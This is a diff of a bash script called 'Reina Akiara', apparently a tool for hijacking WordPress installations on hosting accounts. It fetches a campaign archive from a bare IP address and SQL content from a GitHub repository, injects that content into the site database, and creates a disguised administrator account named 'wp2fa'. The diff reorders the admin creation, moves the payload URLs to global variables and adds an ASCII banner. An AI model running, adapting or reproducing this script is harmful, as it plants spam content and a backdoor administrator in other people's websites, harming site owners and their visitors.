@@ -1,14 +1,14 @@
 #!/bin/bash 
 # Reina Akiara v.0.1
 
+source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
+xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
+sql_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.txt"
 
 
 
 _INSTALLWP() {
 	owner=$(echo -e "$(pwd)" | cut -d "/" -f3)
-	source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
-	xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
-	sql_agc=""
 	if [[ $(id | grep "root" ) ]]; then extra="--allow-root"; else extra=""; fi
 
 	echo -e ""
@@ -78,16 +78,9 @@ _INSTALLWP() {
 }
 _INSTALLAGC() {
 	username="wp2fa"
-	source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
-	xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
-	sql_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.txt"
-
 
 	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
 
-	#	Creating User
-	php wp-cli.phar user create ${username} admin@gmail.com --role=administrator
-	echo -e "[+] Username: ${username}"
 	echo -e "[~] Changing Permalinks..."
 		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'"
 		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'"
@@ -101,13 +94,25 @@ _INSTALLAGC() {
 	wget ${sql_agc} -O agc.sql
 	sed -i -e 's/blogwpx_/'"$(php wp-cli.phar db prefix $extra)"'/g' agc.sql
 	php wp-cli.phar db import agc.sql
+	php wp-cli.phar user create ${username} admin@gmail.com --role=administrator
+	echo -e "[+] Username: ${username}"
 }
 
 
 
+echo -e "
 
 
-echo -e "[~] Checking WP-CLI.phar is supported or no"
+██████╗ ███████╗██╗███╗   ██╗ █████╗      █████╗ ██╗  ██╗██╗ █████╗ ██████╗  █████╗ 
+██╔══██╗██╔════╝██║████╗  ██║██╔══██╗    ██╔══██╗██║ ██╔╝██║██╔══██╗██╔══██╗██╔══██╗
+██████╔╝█████╗  ██║██╔██╗ ██║███████║    ███████║█████╔╝ ██║███████║██████╔╝███████║
+██╔══██╗██╔══╝  ██║██║╚██╗██║██╔══██║    ██╔══██║██╔═██╗ ██║██╔══██║██╔══██╗██╔══██║
+██║  ██║███████╗██║██║ ╚████║██║  ██║    ██║  ██║██║  ██╗██║██║  ██║██║  ██║██║  ██║
+╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+                                                                                    
+
+"
+echo -e "[~] Checking WP-CLI.phar is supported or not"
 curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
 if [[ $(php wp-cli.phar $extra | grep "WP-CLI only works correctly from the command line") ]];
 then
